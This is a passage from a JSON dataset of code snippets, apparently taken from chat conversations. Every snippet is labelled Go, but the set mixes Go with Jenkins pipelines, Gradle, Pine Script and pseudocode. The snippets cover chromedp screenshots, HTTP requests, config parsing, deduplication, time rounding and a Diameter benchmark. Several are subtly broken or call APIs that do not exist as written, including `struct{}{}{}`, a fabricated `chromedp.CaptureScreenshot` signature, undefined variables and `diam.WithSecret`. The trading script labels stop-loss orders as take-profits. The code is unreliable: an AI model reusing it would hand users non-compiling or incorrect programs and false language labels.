fmt.Println(\"Mailboxes:\")\n    for m := range mailboxes {\n        fmt.Println(\"* \" + m.Name)\n    }\n\n    if err := <-done; err != nil {\n        log.Fatalf(\"Failed to list mailboxes: %v\", err)\n    }\n}",
    "filename": "b3fb6081b1ce7a8e5cbe4175c2dfcf55_1.go"
  },
  {
    "conversation_hash": "a1da02b75aba739093e6e3213f36699f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import \"github.com/gin-gonic/gin\"\n\nfunc main() {\n    router := gin.Default()\n\n    router.GET(\"/ping\", func(c *gin.Context) {\n        c.JSON(200, gin.H{\n            \"message\": \"pong\",\n        })\n    })\n\n    router.Run() // listen and serve on 0.0.0.0:8080\n}",
    "filename": "a1da02b75aba739093e6e3213f36699f_0.go"
  },
  {
    "conversation_hash": "a1da02b75aba739093e6e3213f36699f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"github.com/valyala/fasthttp\"\n)\n\nfunc main() {\n    url := \"http://example.com/path\" // 请求 URL\n\n    // 创建一个请求上下文\n    req := fasthttp.AcquireRequest()\n    defer fasthttp.ReleaseRequest(req)\n\n    // 设置请求方法和请求 URL\n    req.SetRequestURI(url)\n    req.Header.SetMethod(\"GET\")\n\n    // 创建一个响应上下文\n    resp := fasthttp.AcquireResponse()\n    defer fasthttp.ReleaseResponse(resp)\n\n    // 发送请求\n    err := fasthttp.Do(req, resp)\n    if err != nil {\n        fmt.Printf(\"请求失败: %v\\n\", err)\n        return\n    }\n\n    fmt.Printf(\"响应状态码: %d\\n\", resp.StatusCode())\n    fmt.Printf(\"响应内容: %s\\n\", resp.Body())\n}",
    "filename": "a1da02b75aba739093e6e3213f36699f_1.go"
  },
  {
    "conversation_hash": "a1da02b75aba739093e6e3213f36699f",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"log\"\n    \"time\"\n\n    \"github.com/chromedp/cdproto/cdp\"\n    \"github.com/chromedp/cdproto/page\"\n    \"github.com/chromedp/chromedp\"\n)\n\nfunc main() {\n    // 新建一个chrome实例\n    ctx, cancel := chromedp.NewContext(\n        context.Background(),\n        chromedp.WithLogf(log.Printf),\n        chromedp.WithErrorf(log.Printf),\n        chromedp.WithViewport(1366, 768), // 设置浏览器分辨率\n        chromedp.WithDefaultExtensionsDisabled,\n        chromedp.WithDialer(chromedp.DialerFromContext(ctx)), // 设置网络代理\n    )\n    // 关闭chrome实例\n    defer cancel()\n\n    // 加载指定URL\n    taskCtx, cancel := context.WithTimeout(ctx, 10*time.Second)\n    defer cancel()\n\n    var buf []byte\n    err := chromedp.Run(taskCtx, fullScreenshot(`https://www.baidu.com/`, &buf))\n    if err != nil {\n        log.Fatal(err)\n    }\n}\n\n// fullScreenshot takes a screenshot of the entire browser viewport.\nfunc fullScreenshot(urlstr string, res *[]byte) chromedp.Tasks {\n    return chromedp.Tasks{\n        chromedp.Navigate(urlstr),\n        chromedp.Sleep(time.Second * 2),\n\n        chromedp.Evaluate(page.GetLayoutMetrics(), &layoutMetrics),\n\n        chromedp.ActionFunc(func(context.Context, cdp.Executor) error {\n            var err error\n            *res, err = page.CaptureScreenshot().\n                WithFormat(page.CaptureScreenshotFormatPng).\n                WithClip(&page.Viewport{\n                    X:      layoutMetrics.ContentX,\n                    Y:      layoutMetrics.ContentY,\n                    Width:  layoutMetrics.clientWidth,\n                    Height: layoutMetrics.clientHeight,\n                    Scale:  1,\n                }).\n                Do(context.Background(), cdp)\n            if err != nil {\n                log.Println(\"err: \", err)\n            }\n            return err\n        }),\n    }\n}",
    "filename": "a1da02b75aba739093e6e3213f36699f_2.go"
  },
  {
    "conversation_hash": "7ac8690b8cfb2c4aacd3370eec2aa896",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "x",
      "y"
    ],
    "code": "recursiveprobe(mine1,mine2,x,y)\n{\n    If x is not equal to 0 and y is not equal to 0 // Prevent boundary and already explored or marked squares\n        For each i from x-1 to x+1\n            For each j from y-1 to y+1\n                If mine1[i][j] is equal to 0 and mine2[i][j] is equal to '.' or '?', then\n                    Set mine2[i][j] to '0'\n                    Call recursiveprobe(mine1,mine2,i,j)\n                Otherwise, if mine1[i][j] is equal to '*', then skip\n                Otherwise,\n                    Set mine2[i][j] to mine1[i][j]\n}",
    "filename": "7ac8690b8cfb2c4aacd3370eec2aa896_1.go"
  },
  {
    "conversation_hash": "742b0b47fed42ada576941991ed8e22b",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "pipeline {\n    agent none\n    environment {\n        //do something here\n    }\n\n    options {\n        //do something here\n    }\n    stages {\n        stage('TF Plan') {\n            when {\n                beforeAgent true\n                expression { return dryRun }\n            }\n            options {\n                lock(\"TF_Lock_${buildName}\")\n            }\n            parallel {\n                stage('Locked TF') {\n                    agent { label publishLabel }\n                    steps {\n                        // Add your required steps here\n                    }\n                    post {\n                        always {\n                          script {\n                            //do something here\n                          }\n                        }\n                    }\n                }\n            }\n        }\n        stage('Deploy') {\n            when {\n                beforeAgent true\n                expression { return !dryRun }\n            }\n            options {\n                lock(\"TF_Lock_${buildName}\")\n            }\n            parallel {\n                stage('LockedTF') {\n                    agent { label publishLabel }\n                    steps {\n                        checkout scm\n                        script {\n                            //do something here\n                        }\n                    }\n                }\n                stage('Docker') {\n                    agent { label windowsLabel }\n                    steps {\n                        checkout scm\n                        script {\n                           //do something here\n                        }\n                    }\n                }\n            }\n            post {\n                always {\n                  script {\n                    //do something here\n                  }\n                }\n            }\n        }\n    }\n}",
    "filename": "742b0b47fed42ada576941991ed8e22b_0.go"
  },
  {
    "conversation_hash": "742b0b47fed42ada576941991ed8e22b",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "pipeline {\n    agent none\n    environment {\n        //do something here\n    }\n\n    options {\n        //do something here\n    }\n    stages {\n        stage('TF Plan') {\n            when {\n                beforeAgent true\n                expression { return dryRun }\n            }\n            options {\n                lock(\"TF_Lock_${buildName}\")\n            }\n            parallel {\n                stage('Locked TF') {\n                    agent { label publishLabel }\n                    steps {\n                        // Add your required steps here\n                    }\n                }\n            }\n        }\n        stage('Deploy') {\n            when {\n                beforeAgent true\n                expression { return !dryRun }\n            }\n            options {\n                lock(\"TF_Lock_${buildName}\")\n            }\n            parallel {\n                stage('LockedTF') {\n                    agent { label publishLabel }\n                    steps {\n                        checkout scm\n                        script {\n                            //do something here\n                        }\n                    }\n                }\n                stage('Docker') {\n                    agent { label windowsLabel }\n                    steps {\n                        checkout scm\n                        script {\n                           //do something here\n                        }\n                    }\n                }\n            }\n        }\n        stage('PostStage') {\n            when {\n                beforeAgent true\n                expression { return !dryRun || dryRun }\n            }\n            agent { label publishLabel }\n            steps {\n                script {\n                    //do something here\n                }\n            }\n        }\n    }\n}",
    "filename": "742b0b47fed42ada576941991ed8e22b_1.go"
  },
  {
    "conversation_hash": "657a05b79b1910ac0885f0afd9e6b94d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// 设置启动参数\nopts := []chromedp.ExecAllocatorOption{\n    chromedp.Flag(\"headless\", true),\n    chromedp.Flag(\"ignore-certificate-errors\", true),\n    chromedp.Flag(\"no-sandbox\", true),\n    chromedp.Flag(\"disable-gpu\", true),\n    chromedp.Flag(\"disable-dev-shm-usage\", true),\n    chromedp.Flag(\"disable-extensions\", true),\n    chromedp.Flag(\"disable-web-security\", true),\n    chromedp.Flag(\"enable-font-antialiasing\", true),  // 开启字体抗锯齿\n    chromedp.Flag(\"enable-font-smoothing\", true),     // 开启字体平滑\n    chromedp.Flag(\"disable-features=InfiniteSessionRestore\", true), \n    chromedp.Flag(\"font-render-hinting=med\", true),   // 设置字体渲染效果为中等\n    chromedp.Flag(\"default-font-size=14\", true),      // 设置默认字体大小\n    chromedp.Flag(\"font-family=sans-serif\", true),    // 设置默认字体\n}\n\n// 创建chrome实例\nctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)\ndefer cancel()\n\n// 创建context\nctx, cancel = chromedp.NewContext(ctx)\ndefer cancel()\n\n// 使用CaptureScreenshot方法截图\nbuf, err := chromedp.CaptureScreenshot(ctx, url, opts...)\nif err != nil {\n    log.Fatal(err)\n}\n\n// 将图片写入文件\nif err = ioutil.WriteFile(\"screenshot.png\", buf, 0644); err != nil {\n    log.Fatal(err)\n}",
    "filename": "657a05b79b1910ac0885f0afd9e6b94d_0.go"
  },
  {
    "conversation_hash": "67bf7f84cdffd2a9755253078ea1797a",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"io/ioutil\"\n)\n\nfunc main() {\n    data := []byte(\"Hello, world!\")\n    err := ioutil.WriteFile(\"output.txt\", data, 0644)\n    if err != nil {\n        fmt.Println(\"Error writing file:\", err)\n    }\n}",
    "filename": "67bf7f84cdffd2a9755253078ea1797a_10.go"
  },
  {
    "conversation_hash": "67bf7f84cdffd2a9755253078ea1797a",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"log\"\n    \"time\"\n\n    \"github.com/chromedp/chromedp\"\n    \"github.com/chromedp/chromedp/device\"\n)\n\nfunc main() {\n    // 创建上下文（Context）\n    ctx, cancel := chromedp.NewContext(context.Background())\n    defer cancel()\n\n    // 设置请求头\n    headers := map[string]interface{}{\n        \"User-Agent\":    device.KindleFireHDX.userAgent,\n        \"Accept\":        \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n        \"Accept-Languag\": \"en-US,en;q=0.5\",\n        \"Accept-Encoding\": \"gzip, deflate, br\",\n        \"Connection\":    \"keep-alive\",\n    }\n\n    // 打开网页\n    var buf []byte\n    url := \"http://www.example.com/\"\n    if err := chromedp.Run(ctx, chromedp.Tasks{\n        chromedp.Navigate(url),\n        chromedp.Sleep(5 * time.Second),\n        chromedp.ActionFunc(func(ctx context.Context) error {\n            // 设置请求头\n            err := chromedp.ActionFunc(func(ctx context.Context) error {\n                return chromedp.NetworkSetExtraHTTPHeaders(headers).Do(ctx)\n            }).Do(ctx)\n            if err != nil {\n                log.Fatal(err)\n            }\n            return nil\n        }),\n        chromedp.Sleep(5 * time.Second),\n        chromedp.Screenshot(\"#main-content\", &buf, chromedp.NodeVisible, chromedp.ByID),\n    }); err != nil {\n        log.Fatal(err)\n    }\n\n    // 将截图保存到文件\n    if err := ioutil.WriteFile(\"screenshot.png\", buf, 0644); err != nil {\n        log.Fatal(err)\n    }\n}",
    "filename": "67bf7f84cdffd2a9755253078ea1797a_11.go"
  },
  {
    "conversation_hash": "4b7e2f1370e45177449537a766f4408c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"log\"\n    \"time\"\n\n    \"github.com/chromedp/cdproto/page\"\n    \"github.com/chromedp/chromedp\"\n)\n\nfunc main() {\n    url := \"https://example.com\"\n\n    // create a new Chrome instance\n    ctx, cancel := chromedp.NewContext(context.Background())\n    defer cancel()\n\n    // navigate to the URL\n    if err := chromedp.Run(ctx, chromedp.Navigate(url)); err != nil {\n        log.Fatal(err)\n    }\n\n    // wait for the page to load completely\n    if err := chromedp.Run(ctx, chromedp.WaitReady(\"body\", chromedp.ByQuery)); err != nil {\n        log.Fatal(err)\n    }\n\n    // take a screenshot of the loaded page\n    var buf []byte\n    if err := chromedp.Run(ctx, chromedp.CaptureScreenshot(&buf)); err != nil {\n        log.Fatal(err)\n    }\n\n    // save the screenshot to a file\n    if err := SaveToFile(\"screenshot.png\", buf); err != nil {\n        log.Fatal(err)\n    }\n}\n\n// SaveToFile saves the given bytes to a file with the given name\nfunc SaveToFile(name string, data []byte) error {\n    f, err := os.Create(name)\n    if err != nil {\n        return err\n    }\n    defer f.Close()\n\n    _, err = f.Write(data)\n    return err\n}",
    "filename": "4b7e2f1370e45177449537a766f4408c_0.go"
  },
  {
    "conversation_hash": "7feeef907e0887e2b7f1328e28063a1e",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "type User struct {\n    Name     string `json:\"name\"`\n    Age      int    `json:\"age\"`\n    Email    string `json:\"email\"`\n    Address  string `json:\"address\"`\n}",
    "filename": "7feeef907e0887e2b7f1328e28063a1e_5.go"
  },
  {
    "conversation_hash": "7feeef907e0887e2b7f1328e28063a1e",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "file, err := os.Open(\"users.json\")\nif err != nil {\n    log.Fatal(err)\n}\ndefer file.Close()",
    "filename": "7feeef907e0887e2b7f1328e28063a1e_6.go"
  },
  {
    "conversation_hash": "7feeef907e0887e2b7f1328e28063a1e",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "var users []User\ndecoder := json.NewDecoder(file)\nerr = decoder.Decode(&users)\nif err != nil {\n    log.Fatal(err)\n}",
    "filename": "7feeef907e0887e2b7f1328e28063a1e_7.go"
  },
  {
    "conversation_hash": "7feeef907e0887e2b7f1328e28063a1e",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"log\"\n    \"os\"\n)\n\ntype User struct {\n    Name     string `json:\"name\"`\n    Age      int    `json:\"age\"`\n    Email    string `json:\"email\"`\n    Address  string `json:\"address\"`\n}\n\nfunc main() {\n    file, err := os.Open(\"users.json\")\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer file.Close()\n\n    var users []User\n    decoder := json.NewDecoder(file)\n    err = decoder.Decode(&users)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // Do something with users\n    for _, user := range users {\n        log.Printf(\"Name: %s, Age: %d, Email: %s, Address: %s\", user.Name, user.Age, user.Email, user.Address)\n    }\n}",
    "filename": "7feeef907e0887e2b7f1328e28063a1e_8.go"
  },
  {
    "conversation_hash": "7feeef907e0887e2b7f1328e28063a1e",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"os\"\n)\n\ntype Config struct {\n    MySQL    MySQLConfig   `json:\"mysql\"`\n    Temporal TemporalConfig `json:\"temporal\"`\n}\n\ntype MySQLConfig struct {\n    Username string `json:\"username\"`\n    Password string `json:\"password\"`\n    IP       string `json:\"ip\"`\n    Port     int    `json:\"port\"`\n}\n\ntype TemporalConfig struct {\n    IP   string `json:\"ip\"`\n    Port string `json:\"port\"`\n}\n\nfunc main() {\n    file, err := os.Open(\"config.json\")\n    if err != nil {\n        fmt.Println(\"Error opening file:\", err)\n        return\n    }\n    defer file.Close()\n\n    decoder := json.NewDecoder(file)\n    config := Config{}\n    err = decoder.Decode(&config)\n    if err != nil {\n        fmt.Println(\"Error decoding JSON:\", err)\n        return\n    }\n\n    fmt.Printf(\"MySQL config: %+v\\n\", config.MySQL)\n    fmt.Printf(\"Temporal config: %+v\\n\", config.Temporal)\n}",
    "filename": "7feeef907e0887e2b7f1328e28063a1e_9.go"
  },
  {
    "conversation_hash": "7feeef907e0887e2b7f1328e28063a1e",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "type Config struct {\n    MySQL    MySQLConfig   `json:\"mysql\"`\n    Temporal TemporalConfig `json:\"temporal\"`\n}\n\ntype MySQLConfig struct {\n    Username string `json:\"username \"`\n    Password string `json:\"password \"`\n    IP       string `json:\"ip\"`\n    Port     int    `json:\"port\"`\n}\n\ntype TemporalConfig struct {\n    IP   string `json:\"ip\"`\n    Port string `json:\"port\"`\n}",
    "filename": "7feeef907e0887e2b7f1328e28063a1e_10.go"
  },
  {
    "conversation_hash": "dc1d32bdfb07ce90ee6c9aa54c05e308",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "android {\n       sourceSets.main {\n           jniLibs.srcDirs = ['libs']\n       }\n   }",
    "filename": "dc1d32bdfb07ce90ee6c9aa54c05e308_1.go"
  },
  {
    "conversation_hash": "f2c531462c53929a6fc516d133f35b5a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func RemoveDuplicateStr(slc []string) []string {\n    result := []string{}\n    temp := map[string]struct{}{}\n    for _, s := range slc {\n        if _, ok := temp[s]; !ok {\n            temp[s] = struct{}{}{}\n            result = append(result, s)\n        }\n    }\n    return result\n}",
    "filename": "f2c531462c53929a6fc516d133f35b5a_0.go"
  },
  {
    "conversation_hash": "f2c531462c53929a6fc516d133f35b5a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type User struct {\n    Id   int64  `xorm:\"pk autoincr\"`\n    Name string `xorm:\"varchar(100)\"`\n    Age  int    `xorm:\"int\"`\n}\nuser := &User{Id: 1, Name: \"Tom\", Age: 18}",
    "filename": "f2c531462c53929a6fc516d133f35b5a_1.go"
  },
  {
    "conversation_hash": "f2c531462c53929a6fc516d133f35b5a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "affected, err := engine.ID(1).Update(user)\nif err != nil {\n    // 异常处理\n}\nfmt.Printf(\"update %d rows\\n\", affected)",
    "filename": "f2c531462c53929a6fc516d133f35b5a_2.go"
  },
  {
    "conversation_hash": "f2c531462c53929a6fc516d133f35b5a",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "type User struct {\n    Id   int64  `xorm:\"pk autoincr\"`\n    Name string `xorm:\"varchar(100)\"`\n    Age  int    `xorm:\"int\"`\n}\nuser := &User{Id: 1, Name: \"Tom\", Age: 18}\naffected, err := engine.Update(user)",
    "filename": "f2c531462c53929a6fc516d133f35b5a_3.go"
  },
  {
    "conversation_hash": "70c5d99f5a9fbebcffe9e041db14a1e5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"time\"\n)\n\nfunc main() {\n    now := time.Now()\n    minutes := now.Minute() % 5   // 取当前分钟数对5取余数\n    lastFiveMinutes := now.Add(time.Duration(-minutes) * time.Minute)   // 减去余数得到上一个5分钟的整点\n    lastFiveMinutes = time.Date(lastFiveMinutes.Year(), lastFiveMinutes.Month(), lastFiveMinutes.Day(),\n        lastFiveMinutes.Hour(), lastFiveMinutes.Minute()/5*5, 0, 0, time.Local)   // 将分钟数调整为5的倍数，秒设置为0\n    lastFiveMinutesUnix := lastFiveMinutes.Unix()   // 获取对应的时间戳\n    println(lastFiveMinutesUnix)\n}",
    "filename": "70c5d99f5a9fbebcffe9e041db14a1e5_0.go"
  },
  {
    "conversation_hash": "0d5e6311eae7eba2f46bcb86bae40054",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tpreviousFiveMinute()\n}\n\nfunc previousFiveMinute() {\n\tnow := time.Now()\n\tminutes := now.Minute()\n\tprevious := minutes - (minutes % 5)\n\n\tyear, month, day, hour, loc := now.Year(), now.Month(), now.Day(), now.Hour(), now.Location()\n\t// 如果 previous 小于 0 ，则减少一小时，并设置分钟数为 60 + previous\n\tif previous < 0 {\n\t\tprevious += 60\n\t\thour -= 1\n\t}\n\n\trounded := time.Date(year, month, day, hour, previous, 0, 0, loc)\n\troundedTimestamp := rounded.Unix()\n\n\tfmt.Printf(\"Current time: %v\\n\", now)\n\tfmt.Printf(\"Last 5 minute boundary: %v\\n\", rounded)\n\tfmt.Printf(\"Last 5 minute boundary timestamp: %v\\n\", roundedTimestamp)\n}",
    "filename": "0d5e6311eae7eba2f46bcb86bae40054_1.go"
  },
  {
    "conversation_hash": "ea62c25b96f806209f238cb1fb0523d8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc removeDuplicates(input []int) []int {\n\t// 创建一个 map 存储已经处理过的元素\n\telements := make(map[int]struct{})\n\tvar result []int\n\n\tfor _, element := range input {\n\t\t// 如果元素尚未处理过，则添加到 map 中，同时将其添加到结果切片中\n\t\tif _, ok := elements[element]; !ok {\n\t\t\telements[element] = struct{}{}\n\t\t\tresult = append(result, element)\n\t\t}\n\t}\n\n\treturn result\n}\n\nfunc main() {\n\tnumbers := []int{1, 2, 3, 4, 4, 5, 6, 6, 7, 8, 9, 9}\n\tfmt.Println(\"Original array: \", numbers)\n\tuniqueNumbers := removeDuplicates(numbers)\n\tfmt.Println(\"Unique elements in array: \", uniqueNumbers)\n}",
    "filename": "ea62c25b96f806209f238cb1fb0523d8_0.go"
  },
  {
    "conversation_hash": "0d5f4fb7b1c5b1d67ac902aeea4de94b",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "{\n  13: \"Monk\",\n  15: \"Lokavit\",\n  17: \"Satya\"\n}",
    "filename": "0d5f4fb7b1c5b1d67ac902aeea4de94b_1.go"
  },
  {
    "conversation_hash": "0d5f4fb7b1c5b1d67ac902aeea4de94b",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "{\n  13: \"Monk\",\n  15: \"Lokavit\",\n  17: \"Satya\"\n}",
    "filename": "0d5f4fb7b1c5b1d67ac902aeea4de94b_3.go"
  },
  {
    "conversation_hash": "c6702b505f8b70c181e3d449b7adfced",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "allprojects {\n    repositories {\n        google()\n        jcenter()\n        maven {\n            url 'https://skia.org/packages'\n        }\n    }\n}",
    "filename": "c6702b505f8b70c181e3d449b7adfced_0.go"
  },
  {
    "conversation_hash": "bae9318ef2a70bbddb57cb58c62e5947",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Println(\"Hello, World!\")\n}",
    "filename": "bae9318ef2a70bbddb57cb58c62e5947_0.go"
  },
  {
    "conversation_hash": "c00c094444482de2ff8e344654318373",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"BTCUSD SuperTrend Dziwne QQE Strategy\", shorttitle = \"SDQ Strategy\", overlay = true)\n\n// Input parameters\nsupertrend_mult = input(3.0, title = \"SuperTrend Multiplier\")\nsupertrend_len = input(10, title = \"SuperTrend Length\")\ndziwne_len = input(14, title = \"Dziwne Length\")\nqqe_rsi_len = input(14, title = \"QQE RSI Length\")\nqqe_wilders_len = input(5, title = \"QQE Wilders Length\")\natr_tp = input(true, title = \"Use ATR for Takeprofit\")\ntakeprofit_percent = input(2.0, title = \"Takeprofit Percent\")\natr_len = input(14, title = \"ATR Length\")\n\n// Supertrend calculation\natr = atr(supertrend_len)\nup = hl2 - (supertrend_mult * atr)\ndown = hl2 + (supertrend_mult * atr)\nTrend_Up = 0.0\nTrend_Down = 0.0\nTrend_Up := close[1] > Trend_Up[1] ? max(up, Trend_Up[1]) : up\nTrend_Down := close[1] < Trend_Down[1] ? min(down, Trend_Down[1]) : down\ntrend_is_up = close > Trend_Up[1]\ntrend_is_down = close < Trend_Down[1]\n\nbgcolor(trend_is_up ? color.new(color.green, 50) : color.new(color.red, 50))\n\n// Dziwne calculation\ndziwne = 0.0\ndziwne := 2 / (dziwne_len + 1) * (close - nz(dziwne[1])) + nz(dziwne[1])\n\nplot(trend_is_up ? Trend_Up : Trend_Down, color = trend_is_up ? color.green : color.red, linewidth = 2, style = plot.style_line, title = \"Trend\")\n\n// QQE Calculation\nsmoothed_rsi = rma(rsi(qqe_rsi_len), qqe_wilders_len)\npair = security(syminfo.tickerid, \"D\", close)\nQQE_Mavg = ema(pair, dziwne_len)\nQQE_Variance = pair - QQE_Mavg\nQQE_StdDev = sqrt(sma(QQE_Variance * QQE_Variance, dziwne_len))\nQQE_ZScore = QQE_Variance / (3 * QQE_StdDev)\n\nplot(QQE_ZScore, color = color.blue, linewidth = 2, title = \"QQE ZScore\")\n\n// Strategy logic\nenter_long = trend_is_up and close > dziwne and QQE_ZScore > 0\nenter_short = trend_is_down and close < dziwne and QQE_ZScore < 0\n\nif (enter_long)\n    strategy.entry(\"Long\", strategy.long)\nelse\n    strategy.close(\"Long\")\n\nif (enter_short)\n    strategy.entry(\"Short\", strategy.short)\nelse\n    strategy.close(\"Short\")\n\n// Takeprofit logic\nif (atr_tp)\n    strategy.exit(\"Takeprofit\", \"Long\", stop = close - atr*atr_len)\n    strategy.exit(\"Takeprofit\", \"Short\", stop = close + atr*atr_len)\nelse\n    strategy.exit(\"Takeprofit\", \"Long\", profit = round(takeprofit_percent / 100 * close))\n    strategy.exit(\"Takeprofit\", \"Short\", profit = round(takeprofit_percent / 100 * close))",
    "filename": "c00c094444482de2ff8e344654318373_0.go"
  },
  {
    "conversation_hash": "38029136efa9543f092085c872c5c409",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func NewServer() *smppServer {\n    ...\n    srv.connectedIPs = make(map[string]bool)\n    ...\n}",
    "filename": "38029136efa9543f092085c872c5c409_1.go"
  },
  {
    "conversation_hash": "38029136efa9543f092085c872c5c409",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func (srv *smppServer) Start() error {\n    ...\n    if srv.connectedIPs[handleConnAddr] {\n        return fmt.Errorf(\"only one connection allowed per IP address\")\n    }\n    srv.connectedIPs[handleConnAddr] = true\n    ...\n}",
    "filename": "38029136efa9543f092085c872c5c409_2.go"
  },
  {
    "conversation_hash": "38029136efa9543f092085c872c5c409",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func handleConn(srv *smppServer, conn net.Conn) {\n    handleConnAddr := conn.RemoteAddr().String()\n    defer func() {\n        conn.Close()\n        delete(srv.connectedIPs, handleConnAddr)\n    }()\n    ...\n}",
    "filename": "38029136efa9543f092085c872c5c409_3.go"
  },
  {
    "conversation_hash": "38029136efa9543f092085c872c5c409",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "// domain/models/config.go\n\ntype PostgresConfig struct {\n    Host     string\n    Port     int\n    User     string\n    Password string\n    Database string\n}",
    "filename": "38029136efa9543f092085c872c5c409_4.go"
  },
  {
    "conversation_hash": "38029136efa9543f092085c872c5c409",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "// infra/postgres/postgres_repository.go\n\ntype PostgresRepository struct {\n    config *PostgresConfig\n}\n\nfunc NewPostgresRepository(config *PostgresConfig) (*PostgresRepository, error) {\n    // validate and process configuration\n    err := validatePostgresConfig(config)\n    if err != nil {\n        return nil, err\n    }\n    // initialize repository with validated configuration\n    repo := PostgresRepository{\n        config: config,\n    }\n    return &repo, nil\n}\n\nfunc (r *PostgresRepository) Connect() error {\n    // connect to postgres using config parameters\n    connStr := fmt.Sprintf(\"host=%s port=%d user=%s password=%s dbname=%s\",\n        r.config.Host, r.config.Port, r.config.User, r.config.Password, r.config.Database)\n    db, err := sql.Open(\"postgres\", connStr)\n    if err != nil {\n        return err\n    }\n    // test connection and return error if failed\n    err = db.Ping()\n    if err != nil {\n        return err\n    }\n    // connection successful, store db connection as repository state\n    r.db = db\n    return nil\n}\n\n// other repository methods for interacting with Postgres database",
    "filename": "38029136efa9543f092085c872c5c409_5.go"
  },
  {
    "conversation_hash": "38029136efa9543f092085c872c5c409",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "// app/main.go\n\nconfig := &PostgresConfig{\n    Host:     \"localhost\",\n    Port:     5432,\n    User:     \"myuser\",\n    Password: \"mypassword\",\n    Database: \"mydatabase\",\n}\n\nrepo, err := NewPostgresRepository(config)\nif err != nil {\n    // handle error\n}",
    "filename": "38029136efa9543f092085c872c5c409_6.go"
  },
  {
    "conversation_hash": "38029136efa9543f092085c872c5c409",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n\t\"time\"\n\n\t\"github.com/fiorix/go-diameter/diam\"\n\t\"github.com/fiorix/go-diameter/diam/diamtest\"\n)\n\nfunc main() {\n\t// Define the benchmark parameters\n\tconcurrency := 100\n\tduration := 10 * time.Second\n\tserverAddr := \"localhost:3868\"\n\trealm := \"testrealm\"\n\tsecret := \"testing123\"\n\n\t// Define the Diameter message that will be sent in the benchmark\n\treq := diam.NewRequest(diam.CER, 0, nil)\n\treq.NewAVP(diam.OriginHost, diam.Mbit, 0, []byte(\"client\"))\n\treq.NewAVP(diam.OriginRealm, diam.Mbit, 0, []byte(realm))\n\n\t// Create a slice to store the benchmark results\n\tresults := make(chan time.Duration, concurrency)\n\n\t// Start the benchmark with the specified number of concurrent clients\n\tvar wg sync.WaitGroup\n\tfor i := 0; i < concurrency; i++ {\n\t\twg.Add(1)\n\t\tgo func() {\n\t\t\tdefer wg.Done()\n\n\t\t\t// Create a new Diameter client connection\n\t\t\tconn, err := diam.Dial(serverAddr, diam.WithSecret([]byte(secret)))\n\t\t\tif err != nil {\n\t\t\t\tfmt.Println(\"Error connecting:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tdefer conn.Close()\n\n\t\t\t// Send the Diameter message and measure the response time\n\t\t\tstart := time.Now()\n\t\t\t_, err = conn.Send(req)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Println(\"Error sending:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tresponseTime := time.Since(start)\n\n\t\t\t// Store the benchmark result\n\t\t\tresults <- responseTime\n\t\t}()\n\t}\n\n\t// Wait for all goroutines to finish\n\tgo func() {\n\t\twg.Wait()\n\t\tclose(results)\n\t}()\n\n\t// Calculate the benchmark results\n\tvar count, total time.Duration\n\tfor result := range results {\n\t\tcount++\n\t\ttotal += result\n\t}\n\tavgResponseTime := total / count\n\trequestsPerSecond := float64(count) / duration.Seconds()\n\n\t// Print the benchmark results\n\tfmt.Printf(\"Concurrency: %d\\n\", concurrency)\n\tfmt.Printf(\"Duration: %v\\n\", duration)\n\tfmt.Printf(\"Total requests: %d\\n\", count)\n\tfmt.Printf(\"Requests per second: %.2f\\n\", 